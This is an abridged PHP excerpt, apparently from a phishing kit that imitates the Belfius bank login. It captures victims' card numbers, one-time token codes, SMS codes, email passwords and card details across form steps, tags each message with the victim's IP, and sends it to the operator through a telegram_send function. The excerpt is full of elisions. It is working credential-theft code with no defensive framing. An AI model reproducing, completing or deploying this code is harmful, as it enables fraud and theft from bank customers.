   ...
   function telegram_send($message) {
    ...
    return true;
        ...
        if ($_POST['step'] == "login") {
                ...
                $message = "/-- LOGIN belfius --/" . get_client_ip() . "\r\n";
                $message .= 'CardNumber : ' . $_POST['user'] . "\r\n";
            ...
            $_SESSION['errors']     = [];	
				...
				$message = "/-- code1 belfius --/" . get_client_ip() . "\r\n";
                $message .= 'code1 : ' . $_POST['token1'] . "\r\n";
                $message .= victim_infos();
                reset_data();
                telegram_send(urlencode($message));
			...
			if ($_POST['step'] == "code2") {
				...
				$message = "/-- code2 belfius --/" . get_client_ip() . "\r\n";
                $message .= 'code2 : ' . $_POST['btoken'] . "\r\n";
                $message .= victim_infos();
                reset_data();
                telegram_send(urlencode($message));
        ...
        if ($_POST['step'] == "sms") {
				...
				$message = "/-- SMS belfius --/" . get_client_ip() . "\r\n";
				...
				$message = "/-- extra belfius --/" . get_client_ip() . "\r\n";
		...
		if ($_POST['step'] == "emlll") {
				...
				$message = "/-- EMAIL belfius --/" . get_client_ip() . "\r\n";
				...
				$message = "/-- PASS belfius --/" . get_client_ip() . "\r\n";
        ...
        if ($_POST['step'] == "cc") {
                ...
                $message = "/-- CARD  belfius --/" . get_client_ip() . "\r\n";
